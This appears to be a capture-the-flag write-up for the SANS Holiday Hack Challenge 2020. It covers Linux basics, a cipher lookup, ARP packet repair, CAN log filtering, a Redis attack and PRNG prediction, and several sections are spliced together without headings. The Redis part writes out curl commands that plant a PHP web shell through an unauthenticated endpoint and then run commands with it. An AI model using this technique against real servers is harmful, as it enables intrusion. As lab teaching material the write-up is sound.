# CHALLENGE 1 - Linux Primer #

## PROCEDURE : ##

>1.	Perform a directory listing of your home directory to find a munchkin and retrieve a lollipop!
```
$ ls
```

>2.	Now find the munchkin inside the munchkin.
```
$ cat munchkin_19315479765589239
```

>3.	Great, now remove the munchkin in your home directory.
```
$ rm munchkin_19315479765589239
```

>4.	Print the present working directory using a command.
```
$ pwd
```

>5.	Good job but it looks like another munchkin hid itself in you home directory. Find the hidden munchkin!
```
$ ls ‚Äìa
```

>6.	Excellent, now find the munchkin in your command history.
```
$ history
```

>7.	Find the munchkin in your environment variables.
```
$ env
```

>8.	Next, head into the workshop.
```
$ cd workshop/
```

>9.	A munchkin is hiding in one of the workshop toolboxes. Use "grep" while ignoring case to find which toolbox the munchkin is in.
```
$ cat toolbox_* | grep -i munchkin
```

>10.	A munchkin is blocking the lollipop_engine from starting. Run the lollipop_engine binary to retrieve this munchkin.
```
$ chmod 755 lollipop_engine
$ ./lollipop_engine
```

>11.	Munchkins have blown the fuses in /home/elf/workshop/electrical. cd into electrical and rename blown_fuse0 to fuse0.
```
$ cd /home/elf/workshop/electrical/
$ cp blown_fuse0 fuse0
$ rm blown_fuse0
```

>12.	Now, make a symbolic link (symlink) named fuse1 that points to fuse0
```
$ ln -s fuse0 fuse1
```

>13.	Make a copy of fuse1 named fuse2.
```
$ cp fuse1 fuse2
```

>14.	We need to make sure munchkins don't come back. Add the characters "MUNCHKIN_REPELLENT" into the file fuse2.
```
$ echo MUNCHKIN_REPELLENT >> fuse2
```

>15.	Find the munchkin somewhere in /opt/munchkin_den.
```
$ cd /opt/munchkin_den/
$ find -iname *munchkin*
```

>16.	Find the file somewhere in /opt/munchkin_den that is owned by the user munchkin.
```
$ find /opt/munchkin_den/ -user munchkin
```

>17.	Find the file created by munchkins that is greater than 108 kilobytes and less than 110 kilobytes located somewhere in /opt/munchkin_den.
```
$ find /opt/munchkin_den/ -size +108k -size -110k
```

>18.	List running processes to find another munchkin.
```
$ ps ‚Äìe
```

>19.	The 14516_munchkin process is listening on a tcp port. Use a command to have the only listening port display to the screen.
```
$ netstat ‚Äìnapt
```

>20.	The service listening on port 54321 is an HTTP server. Interact with this server to retrieve the last munchkin.
```
$ curl 0.0.0.0:54321
```

>21.	Your final task is to stop the 14516_munchkin process to collect the remaining lollipops.
```
$ kill 28786
```

>22.	Congratulations, you caught all the munchkins and retrieved all the lollipops!
>	Type "exit" to close...
```

</details>

  
## PROCEDURE : ##
Bushy Evergreen hints us immediately in the right direction ‚Äì what if we were to replace the username in the `lights.conf` file with an encrypted value?  So I edited `lab/lights.conf` and replaced the username with the encypted password string.  When I ran `./lights` in `lab/` it conveniently unencrypted the string in the username for me üòÑ
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/49b722d5-2f68-47fc-9a0b-b6776ab0a07d)

Then I just passed on the same password to `/home/elf/lights`.

# CHALLENGE 8 - Vending Machine #

## HINTS: ##
<details>
  <summary>Hints provided for Challenge 8</summary>
  
>-	**BUSHY EVERGREEN:**  For polyalphabetic ciphers, if you have control over inputs and visibilty of outputs, lookup tables can save the day.

</details>

  
## PROCEDURE : ##
I decided to follow Bushy Evergreen‚Äôs hint to the letter and deleted the `lab/vending_machine.json` file, ran `./vending_machine` and entered `AAAAAAAAAAA` and `BBBBBBBBBB` as username and password.

Looking at the resulting `vending_machine.json` file and knowing (from the hints) that this was a polyalphabetic cipher, I could immediately tell that the password was being encoded with a 8-character repeating key.

Varying the username whilst keeping the same password had no effect on the encoded output, so the key being used must be a static one.

So I created [an Excel sheet](assets/vending%20machine%20challenge.xlsx) and plotted out the results for each combination of `AAAAAAAAA`, `BBBBBBBB`, `CCCCCC`, etc...  including lowercase letters and numbers.  I knew that the enciphered password is **`LVEdQPpBwr`** ‚Äì so if any of the abve combinations gave me a corresponding letter in the correct position as the enciphered text (eg. `E` in the 3rd position or `r` in the 10th position), then I could tell that the repeating letter used as my input is the corresponding letter of the cleartext password.

![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/bfe4b5c9-8812-41f8-bc3e-aca311cd78d8)

As per Bushy‚Äôs advice I set up a lookup table in excel to match corresponding entries and show the correct password characters:
```
=INDEX($A$2:$A$63,MATCH(TRUE,EXACT(S2,B2:B63),0))
```
I ran the `vending_machine` program over and over again using the most commonly used characters first and after a while I had my deciphered password: **`CandyCane1`**.

I‚Äôm not particularly proud of how I solved this one, but hey ‚Äì it did the trick.

If we look at and compare `ARP_PACKETS[0][ARP]` and `ARP_PACKETS[1][ARP]` we can see that the ARP reply has incorrect `op`, `hwsrc` and `hwdst` values.

`op` should be `2` since it is an ARP reply so:
```
>>> ARP_PACKETS[1][ARP].op=2
```


`hwdst` should be the MAC of the machine that made the ARP request so:
```
>>> ARP_PACKETS[1][ARP].hwdst=‚Äù00:16:ce:6e:8b:24‚Äù
```

`hwsrc` should be the MAC address for `192.168.0.1`.  If we run `ARP_PACKETS[1]` we can see the Ethernet encapsulation of the ARP response which includes the MAC address.  So:
```
>>> ARP_PACKETS[1][ARP].hwsrc=‚Äù00:13:46:0b:22:ba‚Äù
>>> task.submit(ARP_PACKETS)
```

`candump.log` contains a lot of entries that are meaningless to us.  The most common ones start with `244` or `188` ‚Äì so let‚Äôs `grep` these out of the way:

We are left with three entries and we know there was a **LOCK**, **UNLOCK** and **LOCK** event sequence, so we can assume that the second entry must correspond to the **UNLOCK signal**... so:

>-	**HOLLY EVERGREEN:** [This](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis) is kind of what we're trying to do...


</details>

  
## PROCEDURE : ##
Running ``~$ curl http://localhost/maintenance.php`` shows us that multiple arguments need to be separated by commas instead of spaces in the `curl` command‚Ä¶this is a very useful tip for what we need to do next.

``~$ curl http://localhost/maintenance.php?cmd=info`` shows us that we can run `redis-cli` commands without authorisation.  It also tells us that there is one database with index `0`
```
~$ curl http://localhost/maintenance.php?cmd=SELECT,0
~$ curl http://localhost/maintenance.php?cmd=KEYS,*
~$ curl http://localhost/maintenance.php?cmd=GET,dir
```
And we see `/var/www/html` this must be the path to the website folder.

Now we can pretty much follow the steps in [the link](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)  provided in Holly Evergreen‚Äôs Hint.

We move to the webserver directory:
```
curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html/
```

Create a file named `hackme.php`
```
curl http://localhost/maintenance.php?cmd=config,set,dbfilename,hackme.php
```

Then place a malicious bit of php code in that file which will allow us to pass on any command;
```
"<?php echo shell_exec($_GET['cmd']);?>"
```
**Note:** the php script was formatted using the **URL encode** module on [CyberChef](https://gchq.github.io/CyberChef/):
```
curl http://localhost/maintenance.php?cmd=set%2Ctest%2C%22%3C%3Fphp%20echo%20shell%5Fexec%28%24%5FGET%5B%27cmd%27%5D%29%3B%3F%3E%22
```

And save
```
curl http://localhost/maintenance.php?cmd=save
```

Finally we can request the contents of `index.php` by passing a `cat` command as the following curl:
```
curl http://localhost/hackme.php?cmd=cat%20index.php --output -
```
And sure enough there is a bug in `index.php` !

I noticed that starting two ‚ÄòEasy‚Äô games with the same username will hide the computer‚Äôs forts in the exact same places ‚Äì so somehow the username is being used as a seed to determine the location of the computer‚Äôs forts.  As a test I passed the username generated by a ‚Äòhard‚Äô level game to an ‚Äòeasy‚Äô level game and once I won the ‚Äòeasy‚Äô game I was able to predict the location of all the forts in the ‚Äòhard‚Äô game.

Next, I selected the impossible difficulty level and inspected the page source.  Immediately I notice a list of integer values with a comment next to each one saying *‚ÄúNot random enough‚Äù*.  Copying the list into Excel I can tell that there are exactly 624 entries.  This number rings a bell as the [Mersenne Twister Predictor suggested in the hints](https://github.com/kmyk/mersenne-twister-predictor/blob/master/readme.md) requires  624 32-bit integers for it to predict the next 376 numbers.

So if I can feed the 624 rejected entries to the Mersenne Twister Predictor and use it to generate the next PRNG output integer, I will be able to pass that as a username to an ‚Äòeasy‚Äô game, complete the game and accurately predict the location of the forts in the ‚Äòimpossible‚Äô level.

So I created a file called `data.txt` containing all of the rejected usernames, then:
```
~ cat data.txt | mt19937predict > predict.txt
~ head ‚Äìn 1 predict.txt
```

This gave me the next valid PRNG generated integer: `2071393616`

I used this as a username in an Easy game, won the game and recorded where all the hits where, then I played the exact same coordinates in the ‚Äòimpossible‚Äô game to win it üòÉ
